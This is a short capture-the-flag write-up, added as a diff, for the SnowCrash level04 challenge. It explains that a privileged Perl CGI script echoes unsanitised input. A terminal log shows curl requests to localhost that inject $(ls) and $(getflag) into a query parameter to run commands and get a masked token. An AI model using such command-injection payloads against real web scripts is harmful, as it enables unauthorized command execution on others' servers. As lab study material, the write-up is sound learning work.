@@ -1,0 +1,32 @@
+perl scripts usually used by webdevelopers and sys administrators, here we have vulnerable cgi-bin script, which take the input from
+the user then echo it without proper parsing, after playing with the input I found that I can retrieve env variables, then I was able to execute commands by passing $(command),
+so I got the flag as the script has escalated privileges
+
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=a'
+a
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=$a'
+
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=$LANG'
+
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=$PWD'
+/var/www/level04
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=$SHLVL'
+
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=$USER'
+
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x=$PWD'
+/var/www/level04
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$(echo hi)"'
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$(echo hi; ls)"'
+level04@SnowCrash:/var/www/level04$ export PATH=$a
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$(echo hi; ls)"'
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="d"'
+d
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$PWD"'
+/var/www/level04
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$PWd"'
+
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$(ls)"'
+level04.pl
+level04@SnowCrash:/var/www/level04$ /usr/bin/curl 'localhost:4747/level04.pl?x="$(getflag)"'
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXX
